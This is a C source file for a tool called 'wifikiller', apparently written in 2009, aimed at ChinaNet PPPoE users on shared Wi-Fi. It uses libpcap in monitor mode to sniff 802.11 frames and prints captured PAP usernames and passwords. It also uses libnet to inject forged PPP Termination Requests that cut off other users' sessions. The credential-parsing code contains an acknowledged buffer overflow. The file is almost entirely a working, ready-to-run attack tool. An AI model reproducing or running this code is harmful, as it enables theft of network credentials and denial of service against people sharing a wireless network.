/*
 * main.c
 *
 *  Created on: 2009-11-13
 *      Author: Proton
 */

#define QOS_FRAME 0

#include <unistd.h>
#include <sys/types.h>

#include <pcap/pcap.h>
#include <libnet.h>
#include <signal.h>
#include "routines.h"


/* Header Definitions */
struct ieee80211_radiotap_header {
	u_char it_version;		/* Version 0. Only increases
				 * for drastic changes,
				 * introduction of compatible
				 * new fields does not count.
				 */
	u_char it_pad;
	u_int16_t it_len;		/* length of the whole
				 * header in bytes, including
				 * it_version, it_pad,
				 * it_len, and data fields.
				 */
	u_long it_present;	/* A bitmap telling which
				 * fields are present. Set bit 31
				 * (0x80000000) to extend the
				 * bitmap by another 32 bits.
				 * Additional extensions are made
				 * by setting bit 31.
				 */
};


struct ieee80211_frame {
	/*
	 * Protocol Version: 2 bits 0
	 * Type: 2 bits 2
	 * Subtype: 4 bits 4
	 *
	 * ToDS: 1 bit 8
	 * FromDS: 1 bit 9
	 * MoreFrag: 1 bit 10
	 * Retry: 1 bit 11
	 * Power Mgmt: 1 bit 12
	 * More Data: 1 bit 13
	 * WEP: 1 bit 14
	 * Order: 1 bit 15
	 */
	u_int16_t	i_fc; //This is ok, thank god is ALL little endian
	u_int16_t	i_dur;
	u_int8_t	i_addr1[6];
	u_int8_t	i_addr2[6];
	u_int8_t	i_addr3[6];

	/*
	 * Fragment Number: 4 bits 0
	 * Sequence Number: 12 bits 4
	 */
	u_int16_t	i_seq;
#ifdef QOS_FRAME
	u_int8_t	i_qos[2];
#endif
	/* possibly followed by addr4[IEEE80211_ADDR_LEN]; */
	/* see below */
} __packed;

struct pppoe_session {
	u_char version_type; // this byte should always be 0x11 -> Version = 1 and Type = 1
	u_char code; // 0x00 for Session Data
	u_short session_id; // PPPoE Session ID, this is *BIG ENDIAN*
	u_short payload_length; // this is *BIG ENDIAN* too!
};

/* ------------------ */

unsigned char u8aRadiotap[] = {
    0x00, 0x00, // <-- radiotap version
    0x0c, 0x00, // <- radiotap header length
    0x04, 0x80, 0x00, 0x00, // <-- bitmap
    0x00, // <-- rate
    0x00, // <-- padding for natural alignment
    0x18, 0x00, // <-- TX flags
};


// Logical Link Control, don't know what it is,
// but this part of all packets seems the same(except the type field)
unsigned char llcData[] = {
		0xaa, 0xaa, 0x03, // DSAP, SSAP, Control field
		0x00, 0x00, 0x00, // Organization Code: Encapsulated Ethernet, from Wireshark
		0x88, 0x64 // Type: PPPoE Session. OMG this is *BIG ENDIAN* !
};


unsigned char pppoeTerminate[] = {
		0x11, // Version = 1, Type = 1
		0x00, // Session Data
		0x00, 0x00, // Session ID, this is *BIG ENDIAN* !
		0x00, 0x19, // Payload length, this is *BIG ENDIAN* !

		0xc0, 0x21, // Link Control Protocol

		0x05, // Termination Request
		0x02, // Identifier
		0x00, 0x17, // Length
		0x68, 0x61, 0x63, 0x6b, 0x20, // String "hack HACK HAck haCK"
		0x48, 0x41, 0x43, 0x4b, 0x20,
		0x48, 0x41, 0x63, 0x6b, 0x20,
		0x68, 0x61, 0x43, 0x4b
};


libnet_t *libnet_context;
pcap_t *pcap_context;


int verbose = 0;

unsigned long pktcount[0x10000];

void usage()
{
	printf("Usage: wifikiller <interface> eg: # wifikiller mon0 [-verbose]\n");
	printf("       <interface> should be a wireless adapter in monitor(RFMON) mode.\n");
	printf("       -verbose: print dots when PPP packets captured.");
	printf("By Proton. 2009-11.\n");
	exit(1);
}

void sigint_handler(int sig) // break main loop
{
	struct sigaction sa;
	memset(&sa, 0, sizeof sa);

	sa.sa_handler = SIG_DFL;
	sigaction(SIGINT, &sa, NULL);

	pcap_breakloop(pcap_context);

}

void sigusr1_handler(int sig) // print pktcount
{
	u_long i;
	for(i=0; i<0x10000; i++) {
		if(pktcount[i]) {
			printf("0x%04lX: %lu\n", i, pktcount[i]);
		}
	}
	printf("-------------------------\n");
}

void pcap_callback(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	u_char *p;
	struct ieee80211_frame *pieee; //awesome name ^_^
	struct pppoe_session *ppppoe; //awesome name too o_o

	p = (u_char *)bytes;

	p += ((struct ieee80211_radiotap_header*)p)->it_len; //skip radiotap header

	pieee = (struct ieee80211_frame*)p;

	if(!(((pieee->i_fc >> 2) & 0b11) == 2)) { //Is it Data frame?
		//printf("Data %d", (pieee->i_fc >> 2) & 0b11);
		return;
	}

	{
		int t;
		t = pieee->i_fc>>8 & 0b11;
		if(t == 0 || t == 3) { // IBSS or DS -> DS frame
			return;
		}
	}

	p += sizeof(struct ieee80211_frame);// skip ieee80211_frame header

	//if(((pieee->i_fc >> 4) & 0b1111) == 8) { //What?! QoS Frame?
	//	p += 2; // The additional qos field, nasty hack though.
	//}

	if(0x8864 == ntohs(*(uint16_t*)(&p[6]))) { //The type field in LLC header, is it PPPoE Session?
		// Got one

		p += 8; //sizeof LLC header
		ppppoe = (struct pppoe_session *)p;
		p += sizeof(struct pppoe_session);

		if(0xc023 == ntohs(*(uint16_t*)p) && // Password Authentication Protocol
				p[2] == 0x01) { //Code == Authenticate-Request, GOT IT!
			/* PPP PAP {
			 *     Code: 1 byte
			 *     Identifier: 1 byte
			 *     Length: 2 byte, BIG ENDIAN
			 *     Data: {
			 *         len_username: 1 byte
			 *         username: len_username bytes
			 *         len_password: 1 byte
			 *         password: len_password bytes
			 *     }
			 * }
			 */
			int len;
			char buf[100]; //YES this is a *BUFFER OVERFLOW* vulnerability, I aware of it.

			p += 6; // points to len_username
			len = *p;
			memcpy(buf, p+1, len);
			buf[len] = 0;
			printf("\nWe got an account: %s/", buf);

			p += len+1;
			len = *p;
			memcpy(buf, p+1, len);
			buf[len] = 0;
			printf("%s Session ID: 0x%04X\n", buf, ntohs(ppppoe->session_id));
			return;

		} else if(0xc021 == ntohs(*(uint16_t*)p) && // Link Control Protocol
				p[2] == 0x06) { //Code == Termination Ack
			printf("\nPPP Link 0x%04lX is down.\n", (u_long)ntohs(ppppoe->session_id));

		} else { // ordinary data frames
			u_short sessid;

			sessid = ntohs(ppppoe->session_id);
			pktcount[sessid]++;

			if(verbose)
				write(STDOUT_FILENO, ".", 1); //printf buffers your input, &*%^&#$%^@

			if(pktcount[sessid] > 30) {
				//TIME TO TEAR IT DOWN!!!!
				u_char buf[200];

				memset(buf, 0, sizeof buf);
				p = buf;
				memcpy(p, u8aRadiotap, sizeof u8aRadiotap); //radiotap header
				p[8] = 11; //rate, 5.5M
				p += sizeof(u8aRadiotap);

				//IEEE802.11 frame
#				define P ((struct ieee80211_frame *)p)
#				ifdef QOS_FRAME
				P->i_fc = 0x188; // QoS Data frame, STA -> DS
#				else
				P->i_fc = 0x108; // Data frame, STA -> DS
#				endif

				switch(((pieee->i_fc)>>8) & 0b11) { // ToDS && FromDS flag
				case 1: // STA -> DS
					/*
					memcpy(P->i_addr1, pieee->i_addr1, 6); // BSSID
					memcpy(P->i_addr2, pieee->i_addr2, 6); // Source
					memcpy(P->i_addr3, pieee->i_addr3, 6); // Destination
					*/
					memcpy(P->i_addr1, pieee->i_addr1, 6*3); // all things
					break;

				case 2: // DS -> STA
					memcpy(P->i_addr1, pieee->i_addr2, 6); // BSSID
					memcpy(P->i_addr2, pieee->i_addr1, 6); // Source
					memcpy(P->i_addr3, pieee->i_addr3, 6); // Destination
					break;

				default:
					{
						pcap_dumper_t *pd;

						printf("\nHoly shit, what is it?!\n");
						pd = pcap_dump_open(pcap_context, "/dev/shm/whatdamnpacket");
						pcap_dump((u_char*)pd, h, bytes);
						pcap_dump_close(pd);
						pcap_breakloop(pcap_context);
						return;
					}
					break;
				}
				P->i_dur = 127; // Duration, from wireshark, in microseconds
				P->i_seq = ((pieee->i_seq >> 4) + 5) << 4; // Sequence number
				p += sizeof(struct ieee80211_frame);
#				undef P

				//Logical Link Control
				memcpy(p, llcData, sizeof llcData);
				p+=sizeof llcData;

				//PPPoE Termination Request
				memcpy(p, pppoeTerminate, sizeof pppoeTerminate);
				((struct pppoe_session *)p)->session_id = ppppoe->session_id; //Session ID

				p[9] = 1; //Identifier
				p += sizeof pppoeTerminate;

				libnet_write_link(libnet_context, buf, p - buf); // Send the packet!

				//printf("%08lX, %08lX, %08lX, %ld\n", libnet_context, buf, p, p - buf);
				printf("\nSent PPP Termination Request for Session 0x%04lX\n", (u_long)sessid);

				pktcount[sessid] = 0;
			}
		}
	}
}

int main(int argc, char *argv[])
{

	char *iface;
	char errbuf[200];
	struct sigaction sa;

	printf("Proton's WiFi Killer V0.1 for PPPoE Sessions of ChinaNet\n\n");

	if(argc < 2)
		usage();

	if(geteuid()) {
		printf("This tool requires root privilege!\n");
		return 1;
	}

	iface = argv[1];

	if(argc>2 && strcmp(argv[2], "-verbose") == 0) {
		verbose = 1;
	}

	// initialize libnet
	libnet_context = my_libnet_init(LIBNET_LINK_ADV, iface, errbuf);
	if(!libnet_context) {
		printf("Unable to initialize libnet: %s\n", errbuf);
		return 1;
	}


	// set up pcap
	pcap_context = pcap_open_live(iface, // device
			0x10000, //snaplen
			1, //promiscuous mode
			0, //read timeout
			errbuf //error buff
			);

	if(!pcap_context) {
		printf("Unable to initialize libpcap: %s\n", errbuf);
		return 1;
	}

	memset(&sa, 0, sizeof sa);

	sa.sa_handler = sigint_handler;
	sigaction(SIGINT, &sa, NULL);

	sa.sa_handler = sigusr1_handler;
	sigaction(SIGUSR1, &sa, NULL);

	memset(&pktcount, 0, sizeof pktcount);

	// for debug
	//pd = pcap_dump_open(pcap_context, "/dev/shm/shit");
	// ----------

	pcap_loop(pcap_context,
			-1, // packet count, -1 indicates infinity
			pcap_callback, // callback
			(u_char*)"Proton" //What's this?
			);

	pcap_close(pcap_context);
	libnet_destroy(libnet_context);

	//pcap_dump_close(pd);

	printf("\nProgram terminated.\n");

	return 0;
}
